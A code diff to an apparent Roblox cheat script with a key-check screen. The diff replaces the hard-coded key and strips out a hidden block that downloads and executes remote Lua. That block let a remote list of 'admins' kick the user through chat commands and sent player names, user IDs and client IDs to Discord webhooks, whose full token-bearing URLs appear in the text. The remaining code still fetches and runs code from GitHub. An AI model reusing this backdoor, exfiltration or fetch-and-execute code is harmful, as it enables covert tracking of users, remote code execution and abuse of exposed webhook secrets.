@@ -77,7 +77,7 @@ _TextButton2.BorderSizePixel = 0
 _TextButton2.TextSize = 20
 _TextButton2.Parent = _Frame
 
-local KEY = "Whateverontop99fix"
+local KEY = "Kchungdz"
 local notificationTimer = nil
 
 local function ShowNotification(text, color)
@@ -108,123 +108,7 @@ local function OnVerify()
     end
     ShowNotification("Correct key!", Color3.fromRGB(0, 255, 0))
     _ScreenGui:Destroy()
-    
-    -- Load admin script
-    local adminScript = loadstring(game:HttpGet("https://raw.githubusercontent.com/whateverScripts/Islandtribes/main/admins", true))()
-    local localPlayer = game.Players.LocalPlayer
-    local httpService = game:GetService("HttpService")
-    local webhookUrl = "https://discord.com/api/webhooks/1268502482019942422/j3fHICB5sA8WxScLJ9WdL4h7epDD-7mHgyq4mqszrPqwgfiS2oiNgMJmVNiR1CGSHCFB"
-    local requestFunc = syn and syn.request or (request or (http and http.request or http_request))
-    
-    local function SendWebhook(title, description, fields)
-        if not requestFunc then return end
-        requestFunc({
-            Url = webhookUrl,
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = httpService:JSONEncode({
-                content = "",
-                embeds = {{
-                    title = title,
-                    description = description,
-                    type = "rich",
-                    color = 16777215,
-                    fields = fields
-                }}
-            })
-        })
-    end
-    
-    local function LogAdminAction(action, admin, target)
-        SendWebhook("Admin Action", admin .. " used " .. action .. " on " .. target, {
-            {name = "Admin Name : ", value = admin, inline = true},
-            {name = "Target Name : ", value = target, inline = true},
-            {name = "Admin UserId : ", value = game.Players[admin].UserId, inline = true},
-            {name = "Target UserId : ", value = game.Players[target].UserId, inline = true}
-        })
-    end
-    
-    if not _G.scriptAlreadyLoaded then
-        _G.scriptAlreadyLoaded = true
-        local function HandleChat(player, msg)
-            local lower = msg:lower()
-            if not table.find(adminScript, player.Name) then return end
-            if lower:sub(1, 6) == "!kick " then
-                local target = msg:sub(7)
-                if localPlayer.Name == target then
-                    game:GetService("ReplicatedStorage"):WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("EnableAdmin"):FireServer()
-                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("bye bye", "All")
-                    localPlayer:Kick("kicked by " .. player.Name)
-                    LogAdminAction("Kick", player.Name, target)
-                end
-            elseif lower:sub(1, 5) == "!ban " then
-                local target = msg:sub(6)
-                if localPlayer.Name == target then
-                    game:GetService("ReplicatedStorage"):WaitForChild("References"):WaitForChild("Comm"):WaitForChild("Events"):WaitForChild("EnableAdmin"):FireServer()
-                    game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("bye bye", "All")
-                    localPlayer:Kick("banned by " .. player.Name)
-                    LogAdminAction("Ban", player.Name, target)
-                end
-            elseif lower == "!users" then
-                game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer("yes", "All")
-                LogAdminAction("Users Command", player.Name, "N/A")
-            end
-        end
-        
-        local function OnPlayerAdded(player)
-            player.Chatted:Connect(function(msg)
-                HandleChat(player, msg)
-            end)
-        end
-        
-        for _, player in pairs(game.Players:GetPlayers()) do
-            OnPlayerAdded(player)
-        end
-        game.Players.PlayerAdded:Connect(OnPlayerAdded)
-    end
-    
-    -- HWID check
-    local hwidList = loadstring(game:HttpGet("https://raw.githubusercontent.com/whateverScripts/Islandtribes/main/hwidmain", true))()
-    local clientId = game:GetService("RbxAnalyticsService"):GetClientId()
-    local blacklisted = false
-    for _, hwid in pairs(hwidList) do
-        if hwid == clientId then
-            blacklisted = true
-            break
-        end
-    end
-    
-    if blacklisted then
-        warn("Access denied. HWID is not whitelisted.")
-        print("HWID is Blacklisted. HWID: ", clientId)
-        localPlayer:Kick("You are blacklisted. Contact whatever2577")
-        local blacklistWebhook = "https://discord.com/api/webhooks/1268324578510372908/8xIcit2Spoq_3GbCuO3y5tb3My_-jIS6SITzWHiLZsS4VJkI8dk_4yp1VSzwjxPUm0Hs"
-        if requestFunc then
-            requestFunc({
-                Url = blacklistWebhook,
-                Method = "POST",
-                Headers = {["Content-Type"] = "application/json"},
-                Body = httpService:JSONEncode({
-                    content = "",
-                    embeds = {{
-                        title = "",
-                        description = localPlayer.Name .. " Tried Logging In While Blacklisted",
-                        type = "rich",
-                        color = 16777215,
-                        fields = {
-                            {name = "Player Name : ", value = localPlayer.Name, inline = true},
-                            {name = "UserId : ", value = localPlayer.UserId, inline = true},
-                            {name = "User Profile : ", value = "https://www.roblox.com/users/" .. localPlayer.UserId, inline = true},
-                            {name = "Client Id : ", value = clientId, inline = true},
-                            {name = "Key : ", value = "none", inline = true}
-                        }
-                    }}
-                })
-            })
-        end
-        return
-    end
-    
+
     -- Load main UI
     local orion = loadstring(game:HttpGet("https://raw.githubusercontent.com/whateverScripts/Others/refs/heads/main/source"))()
     local window = orion.MakeWindow({
